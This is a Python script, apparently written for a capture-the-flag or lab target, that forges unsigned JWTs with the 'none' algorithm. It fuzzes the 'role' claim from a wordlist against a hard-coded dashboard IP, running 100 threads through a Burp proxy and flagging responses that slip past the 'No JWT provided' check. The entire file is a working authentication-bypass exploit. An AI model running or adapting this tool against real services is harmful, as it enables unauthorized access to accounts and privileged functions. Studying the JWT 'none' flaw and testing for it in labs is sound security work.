import requests
import base64
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# --- CONFIGURATION ---
TARGET_URL = "http://34.100.175.35:30302/dashboard"
WORDLIST_PATH = "roles.txt"
THREADS = 100  # 20 -> lots of 504s
TIMEOUT = 7 

# Your Custom Logic
FAIL_STRING = "No JWT provided"
FAIL_SIZE_BODY_BYTES = 10382
USE_PROXIES = True
PROXIES = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

# Standard JWT Header for 'none' algorithm
JWT_HEADER = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"

def get_configured_session():
    """Sets up session with retries for 504s and attaches your proxy config."""
    session = requests.Session()
    retry_strategy = Retry(
        total=3,
        backoff_factor=1,
        status_forcelist=[502, 503, 504],
        allowed_methods=["GET"]
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    
    if USE_PROXIES:
        session.proxies.update(PROXIES)
        # Disable SSL verification if using a proxy like Burp with self-signed certs
        session.verify = False 
        
    return session

def b64_encode(payload_dict):
    """Encodes dict to URL-safe Base64 without padding."""
    json_str = json.dumps(payload_dict, separators=(',', ':'))
    encoded = base64.urlsafe_b64encode(json_str.encode()).decode()
    return encoded.replace("=", "")

def test_role(role, session):
    role = role.strip()
    if not role: return None

    payload = {"sub": "anonymous", "role": role}
    jwt_token = f"{JWT_HEADER}.{b64_encode(payload)}."
    
    try:
        # allow_redirects=True as per your modification
        resp = session.get(
            TARGET_URL, 
            cookies={"access_token_cookie": jwt_token}, 
            timeout=TIMEOUT, 
            allow_redirects=True
        )
        
        # Combined Success Criteria:
        # 1. Status isn't a gateway error
        # 2. FAIL_STRING not found in text
        # 3. Response size is not the FAIL_SIZE_BODY_BYTES
        if resp.status_code not in [502, 503, 504]:
            if (FAIL_STRING not in resp.text) and (len(resp.content) != FAIL_SIZE_BODY_BYTES):
                return {
                    "hit": True, 
                    "role": role, 
                    "status": resp.status_code, 
                    "len": len(resp.content), 
                    "token": jwt_token
                }
            
    except requests.exceptions.RetryError:
        return {"hit": False, "role": role, "error": "Max Retries (Gateway Timeout)"}
    except Exception as e:
        return {"hit": False, "role": role, "error": str(e)}
    
    return {"hit": False, "role": role}

def main():
    # Suppress InsecureRequestWarning if using proxy
    if USE_PROXIES:
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    try:
        with open(WORDLIST_PATH, 'r') as f:
            roles = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[-] Error: '{WORDLIST_PATH}' not found.")
        return

    session = get_configured_session()
    hits = []
    
    print(f"[*] Target: {TARGET_URL}")
    print(f"[*] Proxy: {'Enabled' if USE_PROXIES else 'Disabled'}")
    print(f"[*] Filtering: '{FAIL_STRING}' & {FAIL_SIZE_BODY_BYTES} bytes")

    with tqdm(total=len(roles), unit="req", desc="Fuzzing", colour="green") as pbar:
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            future_to_role = {executor.submit(test_role, r, session): r for r in roles}
            
            for future in as_completed(future_to_role):
                res = future.result()
                if res and res.get("hit"):
                    hits.append(res)
                    tqdm.write(f"\n[!] HIT: {res['role']} (Status: {res['status']} | Length: {res['len']})")
                    tqdm.write(f"    JWT: {res['token']}\n")
                
                pbar.update(1)

    print("\n" + "="*60)
    print(f"{'ROLE':<20} | {'STATUS':<8} | {'SIZE':<10}")
    print("-" * 60)
    if hits:
        for h in hits:
            print(f"{h['role']:<20} | {h['status']:<8} | {h['len']:<10}")
    else:
        print("No hits found with current filters.")
    print("="*60)

if __name__ == "__main__":
    main()